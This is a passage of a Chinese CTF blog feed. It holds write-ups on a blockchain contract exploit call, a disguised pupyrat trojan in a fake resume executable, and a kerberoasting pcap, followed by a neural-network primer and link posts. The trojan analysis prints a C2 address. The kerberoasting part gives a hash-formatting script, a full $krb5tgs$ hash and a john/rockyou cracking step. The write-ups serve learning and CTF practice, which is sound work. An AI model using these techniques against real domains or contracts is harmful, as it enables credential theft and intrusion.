class="subst">&#123;bank_contract_address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约ABI: <span class="subst">&#123;contract_interface[<span class="string">&quot;abi&quot;</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/NepCTF2024-Writeup/image-20240827002114725.png" alt="image-20240827002114725"></p><p>合约部署成功，接下来就是对合约中函数的调用。先将abi复制下来另存为一个名为Hack.abi的文件，注意要将abi中的所有单引号替换成双引号。</p><p>然后编写调用函数的脚本，先调用attack函数攻击获取ether，然后调用getflag函数输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://neptune-11192.nepctf.lemonprefect.cn&#x27;</span>))</span><br><span class="line">contract_address = <span class="string">&quot;0x40f60687B44C526775d40e53103C0cA745b260Fb&quot;</span> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Hack.abi&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    abi = json.load(f)</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line">value = w3.to_wei(<span class="number">5</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">contract.functions.attack().transact(&#123;<span class="string">&#x27;value&#x27;</span>: value&#125;)</span><br><span class="line">contract.functions.getflag().transact()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.flag().call())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/NepCTF2024-Writeup/image-20240827002735921.png" alt="image-20240827002735921"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Academic </tag>
            
            <tag> NepCTF </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2024初赛 Misc 简历复现</title>
      <link href="/posts/e0d398d8/"/>
      <url>/posts/e0d398d8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>又是被暴打的一集。。。跟上次京麒ctf一样，盯着下面这道misc看了一天，然后成功爆零。。。不想说什么了（T0T）</p><p>后来通过与<del>从某些途径搞来的</del>官方wp比对，发现——还是和上次京麒ctf一样，就差最后一步了。。。已经到了flag跟前，然后不会了。。。不说了，开始复现（T0T）</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目给了一个叫做张小可 英语教师简历.png.exe的程序</p><h2 id="与答案相同部分"><a href="#与答案相同部分" class="headerlink" title="与答案相同部分"></a>与答案相同部分</h2><p>先对这个程序进行查壳（这里改名为了1.exe）</p><img src="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819213235689.png" alt="image-20240819213235689" style="zoom: 67%;" /><p>upx脱壳</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819213332522.png" alt="image-20240819213332522"></p><p>接下来的步骤正常应该是通过对1.exe逆向，来分析其进行的恶意行为。但是多捣鼓捣鼓也不难弄出来，下面就写我比赛时<del>瞎捣鼓</del>的做法了。</p><h2 id="我的方法"><a href="#我的方法" class="headerlink" title="我的方法"></a>我的方法</h2><p>foremost分解1.exe，得到简历图片</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214026169.png" alt="image-20240819214026169"></p><img src="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214120025.png" alt="image-20240819214120025" style="zoom:67%;" /><p>发现存在lsb隐写，得到一个网址</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214347437.png" alt="image-20240819214347437"></p><p>直接访问，下载得到一个default.a文件</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214517377.png" alt="image-20240819214517377"></p><p>拖进010</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214817604.png" alt="image-20240819214817604"></p><p>可以看到其中存在大量的yyttddd，所以肯定是整体异或yyttddd（这里生成的文件命名为download.exe）</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819215052897.png" alt="image-20240819215052897"></p><p>binwalk一下，得到一个叫做14728.7z的文件</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819221321688.png" alt="image-20240819221321688"></p><p>7zip识别不出来，用trid识别一下，应该是个lzma压缩文件，改一下后缀</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819221534911.png" alt="image-20240819221534911"></p><p>当时比赛的时候我就是卡在这儿了。。。</p><p>实际上，只要写个python脚本加载一下数据就行了。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> pylzma</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;14728.lzma&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = pylzma.decompress(data)</span><br><span class="line">tmp = marshal.loads(data)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819221819896.png" alt="image-20240819221819896"></p><p>可以看出c2服务器的ip地址就是60.177.118.44:3432</p><h2 id="预期方法（后半部分）"><a href="#预期方法（后半部分）" class="headerlink" title="预期方法（后半部分）"></a>预期方法（后半部分）</h2><p>前面已经说过了，到异或yyttddd其实都可以通过对1.exe进行逆向推出来，因此这里就不说了，从得到download.exe开始说。</p><p>我们将download.exe丢进virustotal分析一下可以发现这其实是一个pupyrat的马</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819223954231.png" alt="image-20240819223954231"></p><p>download.exe实际上后面跟着一个lzma格式的配置文件，提取出来就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> pylzma</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;final.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">index = data.find(<span class="string">b&#x27;\x5d\x00\x00\x80\x00\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LZMA signature not found, skipped&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = pylzma.decompress(data[index:])</span><br><span class="line">    tmp = marshal.loads(data)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819224318318.png" alt="image-20240819224318318"></p><p>可以看出c2服务器的ip地址就是60.177.118.44:3432</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> 巅峰极客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-Writeup</title>
      <link href="/posts/116da4e3/"/>
      <url>/posts/116da4e3/</url>
      
        <content type="html"><![CDATA[<h3 id="Wrtieup"><a href="#Wrtieup" class="headerlink" title="Wrtieup"></a><a href="https://www.blog.st4rr.top/writeups/MoeCTF2024Writeup.pdf">Wrtieup</a></h3>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024决赛 Misc kerberoasting复现</title>
      <link href="/posts/c9f9d9a0/"/>
      <url>/posts/c9f9d9a0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有幸跟着X1cT34m的学长们京东总部打了京麒CTF的决赛，结果我盯着下面这道misc题看了一天，然后爆零了(T0T)，队伍排名也不理想，给队里的师傅们磕一个了(T0T)。。。Orz</p><p>赛后我找了出题人，询问后发现，我最最开始得到的答案三问有两问是对的（这题总共有三个问题）。。。结果后面越改越离谱，错的那问仍然一直是错的。。。我还是再沉淀沉淀吧(</p><p>下面是对这题的复现</p></blockquote><p>题目给了一个流量包kerberoasting.pcapng，要求找出以下三问的答案，拼起来求md5值就是flag：</p><p>1、总共枚举到了几个kerberoastable的用户</p><p>2、攻击者得到的kerberoastable的用户的密码</p><p>3、攻击者通过kerberoasting攻击得到权限后进行了约束委派攻击，找出与服务端存在委派关系的用户名称</p><p>首先过滤一下ldap流，可以看到其中有一条查询请求查询到了4个用户</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808152623844.png" alt="image-20240808152623844"></p><p>进一步展开可以看到，这些用户都设置了SPN，因此可以判定他们就是kerberoastable的用户</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808152809412.png" alt="image-20240808152809412"></p><p>接下来过滤一下krb5流翻找，很快就可以看到这四个用户返回的TGS-REP</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808153013132.png" alt="image-20240808153013132"></p><p>展开可以看到返回的票据，其中可以找到enc-part的cipher部分，这一部分其实就是用户密码的hash值</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808163841079.png" alt="image-20240808163841079"></p><p>但是直接用这个值肯定是不行的，需要爆破需要有一定的格式，我们可以用下面的脚本去生成正确的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encType = <span class="string">&quot;23&quot;</span></span><br><span class="line">userName = <span class="string">&quot;&quot;</span></span><br><span class="line">domain = <span class="string">&quot;&quot;</span></span><br><span class="line">spn = <span class="string">&quot;&quot;</span></span><br><span class="line">cipherText = <span class="string">&quot;&quot;</span></span><br><span class="line">formatted_string = <span class="string">&quot;$krb5tgs$&#123;0&#125;$*&#123;1&#125;$&#123;2&#125;$&#123;3&#125;*$&#123;4&#125;$&#123;5&#125;&quot;</span>.<span class="built_in">format</span>(encType, userName, domain, spn, cipherText[:<span class="number">32</span>],</span><br><span class="line">                                                               cipherText[<span class="number">32</span>:])</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br></pre></td></tr></table></figure><p>对于用户VictoriaOrbit，我们可以得到如下的1.hash文件</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*VictoriaOrbit$WHOAMIANONY.COM$whoamianony.com/VictoriaOrbit*$4f5376a8c1190acb1dfb054d25a6e75d$c7a192b7cf3277dff22d0580cb58ea74b6d329823b8e2f0b6eb6cf6b9da5b02e4eb2c4c3aee69dfaff8d7c6d6fa6a7790b565d360864049e647164c51ea1840e5a9a9d14e046848a7e406ec2d2b35966b515b1a18d2805207b3142b6e160884a99e4b823682759d69ad4d83ab5eb3112997507c3deb60e035091aecd215684a719796b87b430d79b47e93a6b205ee42d2a74f3f0a5d2266fb6bc081e346b2f1fc15dc07b1bec60b02d03e9bbc1db72c1c4baa2d16c4f2d001d4fb43f881d1d4d8f1b768c18e01b925fb034d86020380c2cebce4bd0486c223f7f5acb065272c1f7dad806f10f940fbf916861395f766fec9b018a5456cd6a236c314fb8691698dc2c8f41c4ba496a5c33b2dcc97223c6f067c0f10b890668921b34f5d53f42f768086cb2466bd2e15bf18859064d1e7f7282513f5ddefa4dc5e03e29b3f040b35c2342ca833108a3ead9a515a29fd515c63696caedad27ff3de3ead2dbd20619ca743f2797d91a3f4a77a763c9cabf09106887c0d9f02c8a572cb5763c3cbd10e026a69e25b8953dfec41320f42928ae79df79afb8031201264d9c4d22ecc2aaddda2a249ebd1deb89948deb39b485b7870c103ffc667e803a2a2ea99c549274baa3b68d59e6e4865302ed4cd78887255584b91453185aefa3f98e95107c83a9891fc26332e5f2ba71b3f48af6e698176fb7e1304406d10c76343e2e7bc72c948ca93da839629d4f107fad8bc7b5a062fae5ef4f7afbe46862c61b8113bc9ec844d8638c4cebc6b0609d3ad4fb70042b537dba62b58ade791629e342a634e6906711c6e64360ae36aa479a7fcfa6cb3ef7725a74620ddcec820bc56b8975943bb9b89d9dec3a85e2159e15b3dbccfe3d44ef9e6c690287af61271f3250b983f5c266a45444e228e1409c537bb8c00a2cb416597305a0f16443028e6bd35126d77a759b353b4a082810ba4f19b0981dd28aa185628b3a4756b2ec3a39adbc1db2c3d4667b98d306fe668a2316d21029e5070c67fea7737bf174b9dac48f8bd717685c9623f595b0201504b416285b333f073da88d47f7af8ab74b712c08073fc34dabfdaa5d952c070e93e4303287ae420752633d4115caf697eaf75b06277601961476ad0b05ff2679259443486512c90d032945a1f8a3e6707af0e23b6958ea758fbaf46034cddc42a9f38f213806d96aecf6868f0dde4acc3c522c2e337af2215d7eebe0792d4b8151a221e9465bd49058551dc8023a036448b43aab5b8afc7a3615b4d39e97c3efdb455f11c36ddc1172e51a6fabda60573452b23c338d335a7d5b3a6f8cced00b83232331add275432e837b197cee6d095f6ae95e95107c50c0e1532b4445db8395f08594c0e4682d521c2580cdf1452426af7278a4e0dbbbba0d87a926c16249a0ff5976eb65d0ee6603803e57b7621d632f048a4cd5852acdb3be2860806efca2fb616c609ff6e383289c1a232df775992edbe8c7ee2f6915ab8d807d41f00a6618062a2425b40421c45a1eae5d86af38b8</span><br></pre></td></tr></table></figure><p>接下来就是经典操作，用工具john the ripper，字典rockyou.txt进行爆破，得到明文密码4xVictoriax4</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240809000422154.png" alt="image-20240809000422154"></p><p>最后就是找存在委派关系的用户，当时比赛时我就是卡在这里了。。。然而事实上这很简单。。。</p><p>还是过滤ldap流，查看msDS-AllowedToDelegatedTo的部分，即可找到用户名WIN-CORP16</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240809001029442.png" alt="image-20240809001029442"></p><p>所以最终答案是4_4xVictoriax4_WIN-CORP16</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅学AI</title>
      <link href="/posts/780f3936/"/>
      <url>/posts/780f3936/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简单学点AI，防止以后CTF中遇到AI就寄。。。</p><p>本文内容多为搬运+修补，所搬运文章链接在文末</p></blockquote><h2 id="朴素感知机、神经元"><a href="#朴素感知机、神经元" class="headerlink" title="朴素感知机、神经元"></a>朴素感知机、神经元</h2><p>感知机接收多个输入信号，输出一个信号。感知机的信号只有“流 &#x2F; 不流”（1&#x2F;0）两种取值。这里我们认为 0 对应“不传递信号”， 1 对应“传递信号”。最简单的感知机就是将输入进行处理得到中间结果，再将结果经过非线性函数处理输出。一般的，我们也把上述的模型称为<strong>神经元</strong> ，又称作<strong>节点</strong>(node)或<strong>单元</strong>(unit)。</p><h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>由多个神经元可组成<strong>神经网络</strong>。每个节点可以从其他节点接收输入，或者从外部源接收输入，然后计算输出。每个输入都各自的<strong>权重</strong>（weight，即 w），用于调节该输入对输出影响的大小，节点的结构如图所示：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/image-20240731212540830.png" alt="image-20240731212540830"></p><p>其中 x1, x2 作为该节点的输入，其权重分别为 w1 和 w2。同时，还有配有<strong>偏置</strong>b（bias）的输入 ，偏置的主要功能是为每一个节点提供可训练的常量值（在节点接收的正常输入以外）。</p><h2 id="多层感知机"><a href="#多层感知机" class="headerlink" title="多层感知机"></a>多层感知机</h2><p>多层感知机（Multilayer Perceptron）缩写为 MLP，也称作前馈神经网络（Feedforward Neural Network）。它是一种基于神经网络的机器学习模型，通过多层非线性变换对输入数据进行高级别的抽象和分类。下图显示了一个最典型的 MLP，它包括包括三层： <strong>输入层、隐层（全连接层）和输出层</strong> （全连接的意思就是：上一层的任何一个神经元与下一层的所有神经元都有连接）。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-2110a4d62384a277ab700907e73e8721_b.gif" alt="动图"></p><p>它的工作分为两部分:</p><ul><li><strong>前向传播</strong> ：输入数据被馈送到输入层，然后传递到隐藏层，并最终生成输出层的输出。每一层的每一个神经元都会计算其加权输入和非线性激活函数的输出。</li><li><strong>反向传播</strong> ：在训练过程中，输出与期望的输出进行比较，产生一个误差值。这个误差随后被反向传播到网络中，权重得到相应的更新。</li></ul><h3 id="向前传播的计算"><a href="#向前传播的计算" class="headerlink" title="向前传播的计算"></a>向前传播的计算</h3><p>让我们把上面的 MLP 细节化：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-5a81c06789ad5e9323f93c6540263327_r.jpg" alt="img"></p><p>在一般情况下，参与运算的各元素都是 <strong>矩阵</strong>，其中的蓝色方块代表着 <strong>激活函数</strong>，绿色方块代表着 <strong>权重 Weight</strong> 和 <strong>偏置 Bias</strong> 。需要注意的是， ***权重和偏置对应上图中不同神经元的连线***，例如 1-&gt; 3 和 1-&gt; 4 的参数不同。详细计算方式如下图及下式：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-ec822b0f10066f097a074e1ff09167b1_r.jpg" alt="img"></p><p>在分类问题中，最后的输出层元素个数一般等于分类数目，最终的结果代表着该输入被这个 MLP 分为某一类的可能性大小，指越大，代表越可能属于该类。为了便于观测，我们通常使用 softmax 函数将将上一层的原始数据进行归一化，转化为一个(0,1)(0,1) 之间的数值，这些数值可以被当做概率分布，用来作为多分类的目标预测值。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-4452fdaaa04686aa270010f57f4db2aa_r.jpg" alt="img"></p><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>激活函数可为神经元引入非线性因素，使神经网络能够处理更复杂的问题。如果没有激活函数，那么神经网络将变为由一个巨大的线性组合构成。</p><h2 id="BP误差反向传播法"><a href="#BP误差反向传播法" class="headerlink" title="BP误差反向传播法"></a>BP误差反向传播法</h2><p>反向传播算法的核心概念是：<strong>通过比较现实输出与期望输出之间的差异，根据差异来反向更新每一层的参数，从而使现实输出更加贴近于期望输出。</strong></p><p>损失对参数梯度的反向传播可以被这样直观解释：由 A 到传播 B，即由 ∂L&#x2F;∂A∂L&#x2F;∂A 得到 ∂L&#x2F;∂B∂L&#x2F;∂B ，由导数链式法则 ∂L&#x2F;∂B&#x3D;(∂L&#x2F;∂A)⋅(∂A&#x2F;∂B)∂L&#x2F;∂B&#x3D;(∂L&#x2F;∂A)⋅(∂A&#x2F;∂B)。所以神经网络的 BP 就是通过链式法则求出L对所有参数梯度的过程。</p><p>如下图示例，输入x，经过网络的参数 w,b ，得到一系列中间结果 a,h 。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-d38c136a7b018fb3ea7344a902d0e3d1_r.jpg" alt="img"></p><p>下面是具体的推导公式</p><p>右上角的h21到a21:<br>$$<br>\frac{\partial l}{\partial a_{21}}&#x3D;\frac{\partial l}{\partial h_{21}}*\frac{\partial h_{21}}{\partial a_{21}}&#x3D;\frac{\partial l}{\partial h_{21}}*activate’(a_{21})<br>$$<br>a21到h11:<br>$$<br>L&#x3D;f(a_{21},a_{22},a_{23})\frac{\partial L}{\partial h_{11}}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial h_{11}}+\frac{\partial L}{\partial a_{22}}\frac{\partial a_{22}}{\partial h_{11}}+\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial h_{11}}&#x3D;\frac{\partial L}{\partial a_{21}}w_1+\frac{\partial L}{\partial a_{22}}w_2+\frac{\partial L}{\partial a_{23}}w_3<br>$$</p><p>$$<br>\frac{\partial L}{\partial w_1}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial w_1}&#x3D;\frac{\partial L}{\partial a_{21}}h_{11}<br>$$</p><p>$$<br>\frac{\partial L}{\partial b_{21}}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial b_{21}}&#x3D;\frac{\partial L}{\partial a_{21}}<br>$$</p><p>因此，我们可以如下图，将反向传播的表达式如下。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-4564c3328f7f007f2a046076cdac800a_r.jpg" alt="img"></p><p>当然并不是所有的反向传播都是如此即可，还有可能与向前传播时所用的激活函数有关，具体可查看<a href="https://hello-ctf.com/HC_AI/MLP/#_11">原文</a></p><p>参考文章：</p><p><a href="https://hello-ctf.com/HC_AI/MLP/">传送门一</a></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024暑假偷偷练习CTF</title>
      <link href="/posts/e41c2619/"/>
      <url>/posts/e41c2619/</url>
      
        <content type="html"><![CDATA[<p>听说隔壁Dozer的f4k3r师傅校队有内部训练，偷偷过去玩了一下，这里放一下我和f4k3r师傅一起写的wp（未用于提交），方便以后查阅使用</p><p><a href="https://f4k3r.top/2024/07/10/%E4%B8%8E%E5%8D%97%E8%88%AA%E7%9A%84%E6%9A%91%E6%9C%9F%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83WP/">传送门一</a></p><p><a href="https://f4k3r.top/2024/07/28/%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83%E7%BB%93%E8%90%A5%E8%B5%9BWP/">传送门二</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟 2024 Misc 招新题 第二题（需要密码）</title>
      <link href="/posts/c81e8560/"/>
      <url>/posts/c81e8560/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a967121ba5edb66ea27903c4cb538c399392062301813ad9ad3ff2535e27f3db">825b23be34d6e48a379c92804d8d79135d53975bf2365f2e035c8e7905b28225b86ad5516eec10ca54341c6ac523e5949566dd216f630712cd1204115aa0c78e9c3d6f3569a459cf91a9a12d76324433a497bfc882f786747f0fb94af5dfbe8d475f436ae62fd2f6f0c660ef411a891412f4991355f32dd7ccf07dc0cb1a3cf5a5d646b16beea96d015a10a499a14064c5f66763091784d6e8335575e2d7e621bdd858289884f274b0e06229a5431f297a8a8400cc686fb05637677a943f3ce51ebf67336e5b9df5a380d5fb72846425a350a38013bc200c7e4a24b60ba696e218aabbd975c1d4e438be58df9c6b63226c12c9bac5f4f4a7f1a974ae1adb7bf0d5751e6bba63e507126927ffc042f533af1c927470901efc039e7307d8095b2956e56e938d322f78a13bbff05390f782462ae9b6735c05b892578502e54ffab8d6b4d734ec5702e2e7a3eba013d340bb2d8b26ea6f08f5fac97f135f50ab4611f53c1a550fea2df3139dcd0ee66f1e8e6eadc5eaab00facaa38dad115f05598bce090f8bbf218a8e81146d89f289a3367d371c5e48ba0e73c42364dba9beb787bddbdd38a8ed7304b8d978c1de99b2bd6082b7e0e6d47b51587add0299d1709c36031f4e33f0ed46310259e64b0afe70609e6730ff42945f42fc34a6caf99892459915028c59f2d9ab5c100a456036b3324b6cc8349bb47ac60ce83c2f05f282193ea95c5638f9932b3dc46a37a89c9edb9705e104ac1850fd105c4699240ca0849dfd9f885efb07e5c3aca0871da920bedc297247c8ae398e63c62f82ed4d2a0cba8b654c3b773d491d15100f8d23b50d364f6ea27a186207d5c49b268fb36431c1de7cf5d9706e03b39941d6e1d32ff5236b92ec4aaeb5e138ba6f6ce7efa6f4d7aaa42d6475131ffb6d6dcb0341720055b3894b21e7832e60fd78dbbdfbfd9a3bdf53934b7c7e4d1354b9a3d284045ab6da12f4ca291b76739314a0eee25b61673bfce5853d45ed54296eb75be500844a07b67027d775cd1f0c001a3a682180350da02a891827ddbeea6f49d9576b65d4882826360dfbc26a7c67918c5b9e485fd8d390c9b066cc7e8d0756637ff228e993af94988f5a8334c674cf3672af7f0ef460fe19f23803be864ccb65d349f19f440dd57c567f32a890eaf1c06662e15a48a2a298be814efa6e5ddf37ac17418385121861c7ee55a19f4d99367170f98adef3d95f4b3abaeae740a1ce1bb9ff79ee42d8bac0eb3016fcbd990515776df7f09553bf034b51564024d24bef2a5eaabfa4026188c397006d37f4e9f0d4280d8661e9fee2b7284b626a5f4e7ad6be9f8a23cc601999e43d8b194215b1b874d81c327db8616ae8c081e049a9d6aa3d640362ad369313fe34d6ee2d4e8ed935b7addf55e1fbffb6e398c742c2e0924b64b3230e360f6f305156f855b192fdfddd464e6ae409204534ac1dcab306e593211650ed25fea0cabaae73a505a863759420f6467d8f9c77bf05995eb12975348f5609ab0deda53f8f61fc069d4e8710139a0ae5733cf7e29fe5eaa7bd01417ccf04224cb8761784f245e7e25c4ec08e338b2011420d9d78442c9d0c118cea636c783a7cac7b9d4c17e76ff6b9567c08f710d7809af694d6ce7f20e028c19f45b438504dd165cc10243b5b77a383392fa2204c3c068cb7a515ed5e115e449d7eeeed68bf0f9d8bffb41b946aec63ecc32be18f072042dcc6d766c403a39b4f0b04acb3c6a9ea5286664f4e4e87254e7d957c9effc00ef00675dea714f8e9cdc9b5e7389aaf561465cc18a3e0d368d13cfd942f83a6bb86d1b21fe9942ff66737139098d70776b1d0a7c1a4a27888ae3b1f44d2f694c7a15fc2218d9a1aa8ef4daa71b484c71c363d0d3ab9e271c039017f54d064e3f49f2fe05f2300c65ceb957d3506cb06de262e2a0de7d3c65c6ba70b58ef40d0a0d3cec31862605ef0475e4eea293f02accc4571f36fa1b4b68514ab59541fa9377ced0ed50db78ff90c1a9d3d992e7e6029122821f3d67a109885d144cee3c7fbd